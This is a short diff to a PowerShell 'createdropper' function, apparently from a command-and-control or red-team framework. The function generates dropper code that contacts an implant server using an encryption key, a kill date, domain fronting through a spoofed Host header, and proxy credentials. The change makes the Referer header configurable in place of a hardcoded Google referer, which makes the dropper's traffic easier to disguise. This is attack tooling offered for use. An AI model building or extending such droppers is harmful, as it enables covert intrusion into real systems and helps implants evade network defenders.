@@ -1,5 +1,5 @@
 ﻿#dropper
-function createdropper($killdate, $enckey, $domainfrontheader, $ipv4address, $serverport, $username, $password, $proxyurl, [switch]$Daisy, [switch]$Proxy, [switch]$Insecure, $useragent) {
+function createdropper($killdate, $enckey, $domainfrontheader, $ipv4address, $serverport, $username, $password, $proxyurl, [switch]$Daisy, [switch]$Proxy, [switch]$Insecure, $useragent, $referer) {
 
 $newImplant = $urlstring -split ","
 $newImplantURL = $newImplant[0] -replace '"',''
@@ -75,7 +75,7 @@ $h="'+$domainfrontheader+'"
 if ($h -and (($psversiontable.CLRVersion.Major -gt 2))) {$wc.Headers.Add("Host",$h)}
 elseif($h){$script:s="https://$($h)/'+$connect+'"}
 $wc.Headers.Add("User-Agent","'+$useragent+'")
-$wc.Headers.Add("Referer","https://www.google.com")
+$wc.Headers.Add("Referer","'+$referer+'")
 if ($proxyurl) {
 $wp = New-Object System.Net.WebProxy($proxyurl,$true); 
 if ($username -and $password) {
